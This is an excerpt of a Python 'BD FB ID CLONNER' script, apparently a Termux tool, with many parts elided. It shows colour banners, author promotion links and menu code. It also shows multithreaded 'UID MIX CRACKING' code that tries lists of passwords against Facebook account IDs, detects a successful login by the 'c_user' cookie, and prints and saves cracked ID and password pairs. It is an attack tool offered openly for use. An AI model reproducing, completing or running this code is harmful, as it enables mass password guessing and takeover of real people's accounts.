...
logo=(""" DEMONIC x HEMLOCK "RIFAT\033[1;37m
...
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m WELCOME TO SAIKO TEAM RIFAT    \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  🔥...BD FB ID CLONNER...🔥 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║➣\033[1;91m DEVOLPER   :       RIFAT \33[1;92m║               
\33[1;92m║➣ FACEBOOK   :          SAIKO TEAM RIFAT  \33[1;92m║                 
\33[1;92m║➣\033[1;93m TELEGRAM   :          t.me/yourvipaccount   \33[1;92m ║
\33[1;92m║➣\033[1;34m GITHUB     :          no         \33[1;92m ║          
\33[1;92m║➣\033[1;35m TOOLS      :          BD FB ID CLONNER \33[1;92m ║                 
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
""")
def cek_apk(session,coki):
	...
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] THERE IS NO ACTIVE APK.😔")
	else:
		print("")
		print(f'\r🎮 %sHERE IS THE DETAILS OF YOUR ACTIVE APK :'%(H))
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] RUN YOUR CLONNING")
	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] FIND ME ON FACEBOOK")
	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] CONTACT ME ON TELEGRAM")
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN IN OUR TELEGRAM CHANNEL")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://t.me/evandipro');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://t.me/termux_command_store');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	print(logo)
	print(50*'_')
	print(' [1] Contact TELEGRAM ')
	print(' [2] FOLLOW ME ON FB ')
	print(' [3] Subscribe Telegram Channel')
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/evandipro2004?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://t.me/termux_command_store');time.sleep(1)
		admin()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('┗━[•] START BD UID MIX CRACKING... ')
		print(50*'━')
		for guru in user:
	...
	print(' [💉] Ids saved in DEMONIC-ok.txt,DEMONIC-cp.txt')
	print(50*'_')
	exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mDEMONIC\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [DEMONIC x HEMLOCK] '+cid+' | '+ps+'\33[0;92m')
